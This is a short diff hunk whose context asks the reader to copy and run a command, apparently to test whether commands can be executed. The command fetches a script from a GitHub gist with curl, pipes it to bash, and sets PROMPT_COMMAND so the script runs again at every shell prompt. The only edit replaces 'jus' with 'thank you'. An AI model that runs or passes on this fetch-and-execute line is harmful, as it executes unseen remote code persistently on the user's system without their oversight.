@@ -10,4 +10,4 @@ Copy and paste command and run it. We use the gist to see if we can run commands
 
 set -- test && PROMPT_COMMAND="curl -s https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/5ee72d975ab248ec5bed622319902bcefff208d3/calc.sh | bash" && eval "$PROMPT_COMMAND"
 
-jus 
+thank you
